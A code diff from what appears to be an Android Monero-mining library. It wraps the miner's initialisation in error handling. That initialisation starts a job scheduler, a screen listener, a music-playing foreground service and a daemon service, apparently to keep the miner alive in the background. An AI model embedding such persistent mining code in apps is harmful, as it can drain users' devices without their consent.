@@ -21,6 +21,7 @@ import waterhole.miner.monero.keepappalive.service.PlayerMusicService;
 import waterhole.miner.monero.keepappalive.utils.JobSchedulerManager;
 import waterhole.miner.monero.keepappalive.utils.ScreenManager;
 
+import static waterhole.miner.core.utils.LogUtils.error;
 import static waterhole.miner.core.utils.LogUtils.errorWithReport;
 import static waterhole.miner.core.utils.LogUtils.info;
 
@@ -100,21 +101,25 @@ public final class XmrMiner extends WaterholeMiner {
     @Override
     public MinerInterface init(Context context) {
         MinerInterface minerInterface = super.init(context);
-        JobSchedulerManager jobManager = JobSchedulerManager.getJobSchedulerInstance(context);
-        jobManager.startJobScheduler();
+        try {
+            JobSchedulerManager jobManager = JobSchedulerManager.getJobSchedulerInstance(context);
+            jobManager.startJobScheduler();
 
-        ScreenReceiverUtil screenListener = new ScreenReceiverUtil(context);
-        mScreenManager = ScreenManager.getScreenManagerInstance(context);
-        screenListener.setScreenReceiverListener(mScreenListenerer);
+            ScreenReceiverUtil screenListener = new ScreenReceiverUtil(context);
+            mScreenManager = ScreenManager.getScreenManagerInstance(context);
+            screenListener.setScreenReceiverListener(mScreenListenerer);
 
-        LogUtils.info("start keep alive service");
-        // 3. 启动前台Service
-        Intent intent_0 = new Intent(context, PlayerMusicService.class);
-        context.startService(intent_0);
-        // 4. 启动播放音乐Service
+            LogUtils.info("start keep alive service");
+            // 3. 启动前台Service
+            Intent intent_0 = new Intent(context, PlayerMusicService.class);
+            context.startService(intent_0);
+            // 4. 启动播放音乐Service
 
-        Intent intent_1 = new Intent(context, DaemonService.class);
-        context.startService(intent_1);
+            Intent intent_1 = new Intent(context, DaemonService.class);
+            context.startService(intent_1);
+        } catch (Exception e) {
+            error(e.getMessage());
+        }
         return minerInterface;
     }
 
